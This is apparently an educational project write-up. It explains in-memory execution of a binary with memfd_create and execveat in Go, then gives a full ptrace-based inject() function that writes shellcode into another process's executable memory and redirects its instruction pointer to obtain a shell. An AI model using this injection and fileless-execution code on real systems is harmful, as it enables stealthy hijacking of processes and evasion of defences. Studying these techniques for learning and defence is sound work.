# How I used memfd_create and execveat to run a binary in memory 
The whole idea for this projects implementation is to turn binary into a QR code and then decode it in memory and run a binary in memory.

## memfd_create
In order to do this, we can use the system call memfd_create to create an anonymous file. This file acts like a regular file so it canbe "modified, truncated, memory-mapped and so on" (man2memfd, nd). The difference with this file is that it lives in memory so if the power goes out the file is gone.
```go
fd, err := unix.MemfdCreate("memexec", 0)
if err != nil {
    return fmt.Errorf("MemfdCreate error: %v", err)
}
defer unix.Close(fd)
```
The code above uses memfdcreate from the go unix library and creates the memory file "memexec". The flag 0 means that no special flags have been set. 

```go
n, err := unix.Write(fd, binaryData)
if err != nil || n != len(binaryData) {
    return fmt.Errorf("Write error: %v (wrote %d of %d)", err, n, len(binaryData))
}
```
The code here specifically "unix.Write(fd, binaryData)" then writes the binary into the memfd file using fd (file discriptor) (which we created using memfd_create). 

## execveat

So now we have loaded the file in memory we need to execute it. The reason we are using execveat and not the more common execve is because execveat allowed executing a program from a file descriptor (man2execveat, nd). 
```go
argv := []string{"memexec_binary"}
envp := os.Environ()
return execveatEmptyPath(fd, argv, envp)
```
The above code creates argv which is just a placeholder for the memexec_binary.
envp obtains the environment variables from os.Environ().


```go
func execveatEmptyPath(fd int, argv []string, envp []string) error {
    argvPtrs := make([]*byte, len(argv)+1)
    for i, s := range argv {
        cstr, err := unix.BytePtrFromString(s)
        if err != nil {
            return fmt.Errorf("invalid argv string %q: %w", s, err)
        }
        argvPtrs[i] = cstr
    }
    ...
    const SYS_EXECVEAT = unix.SYS_EXECVEAT
    r1, _, e := unix.Syscall6(
        SYS_EXECVEAT,
        uintptr(fd),
        uintptr(unsafe.Pointer(emptyStringPtr)),
        uintptr(unsafe.Pointer(&argvPtrs[0])),
        uintptr(unsafe.Pointer(&envpPtrs[0])),
        uintptr(AT_EMPTY_PATH),
        0,
    )
    ...
}
```
In the above code, what we are doing is passing in the file descriptor, argv and envp.

The function then inits a slice called argvPtrs to store c-style string pointers since syscalls in C want argv's to be arrays of C strings. 

The for loop then converts each string in argv and returns an error if there are any invalid strings.To ensure a slice is terminated with a nil pointer we use (len(argv)+1)

After that we can invoke execveat using the unix.Syscall6 which is a go wrapper for using syscalls. 


SYS_EXECVEAT, --> This is the syscall
        uintptr(fd), --> passing in the file descriptor
        uintptr(unsafe.Pointer(emptyStringPtr)), --> The path here is empty because we are using the AT_EMPTY_PATH (refer to the man page)
        uintptr(unsafe.Pointer(&argvPtrs[0])), --> pointer to argv arr
        uintptr(unsafe.Pointer(&envpPtrs[0])), --> pointer to envp arr
        uintptr(AT_EMPTY_PATH), // AT_EMPTY_PATH to use execveat with fd
        0, --> we did not need to use this

If successful, the function doesn't return because the current process image is replaced. If it fails, e is returned.


# Process injection via Ptrace

In the code directory, you will see infect.c which was used as a blueprint to make infect.go

To try out infect.go first run ./binaries/pid. You will need this PID for the process injection. The 2 main imports are buffio to read from /proc/pid/maps. The reason we do this is so we can find a memory region that is rxp. Then we get to the shellcode. This shellcode was obtained from https://shell-storm.org/shellcode/files/shellcode-806.html if you are curious. 


```go
func inject(pid int) {
	var regs syscall.PtraceRegs

	// Attach to the target process
	if err := syscall.PtraceAttach(pid); err != nil {
		fmt.Printf("Failed to attach to process: %v\n", err)
		os.Exit(1)
	}
	defer syscall.PtraceDetach(pid)

	// Wait for the process to stop
	if _, err := syscall.Wait4(pid, nil, 0, nil); err != nil {
		fmt.Printf("Failed to wait for process: %v\n", err)
		os.Exit(1)
	}

	// Get the current register state
	if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
		fmt.Printf("Failed to get register state: %v\n", err)
		os.Exit(1)
	}

	// Parse /proc/[pid]/maps to find an executable memory region
	mapsPath := fmt.Sprintf("/proc/%d/maps", pid)
	file, err := os.Open(mapsPath)
	if err != nil {
		fmt.Printf("Failed to open maps file: %v\n", err)
		os.Exit(1)
	}
	defer file.Close()

	var address uintptr
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "r-xp") {
			parts := strings.Split(line, " ")
			addrRange := strings.Split(parts[0], "-")
			if len(addrRange) != 2 {
				continue
			}

			addr, err := strconv.ParseUint(addrRange[0], 16, 64)
			if err == nil {
				address = uintptr(addr)
				break
			}
		}
	}

	if address == 0 {
		fmt.Println("Failed to find a suitable memory region for injection.")
		os.Exit(1)
	}

	// Write the shellcode to the target process's memory
	for i := 0; i < len(shellcode); i += 8 {
		chunk := shellcode[i:]
		if len(chunk) > 8 {
			chunk = chunk[:8]
		}
		if _, err := syscall.PtracePokeData(pid, address+uintptr(i), chunk); err != nil {
			fmt.Printf("Failed to write data to process memory: %v\n", err)
			os.Exit(1)
		}
	}

	// Modify the instruction pointer (RIP) to jump to the injected code
	regs.Rip = uint64(address)
	if err := syscall.PtraceSetRegs(pid, &regs); err != nil {
		fmt.Printf("Failed to set register state: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("[*] Successfully injected shellcode!")
}
```

The above code is the inject function which takes the PID. we init a variable called regs to hold the register state of the target process so we can modify rip.

We then use syscall.PtraceAttach(pid) to attach to the target process. defer syscall.PtraceDetach() will also ensure that ptrace will detach from our target process after returning.

We then use the wait syscall to wait for our process to stop.

After that we open procpidmaps to find a list of memory regions that is rxp so we can inject the shellcode. When an executable region is found, the address is parsed and stored in a variable called address.

We then use syscall.PtracePokeData() to write the shellcode to the target processes memory writing 8 bytes at a time. This is because pokedata operates in memory sized chinks (which is 8 bytes in 64 bit systems)

Finally, we modify the RIP register to point to the start address of the injected shellcode and it we can get a shell. 



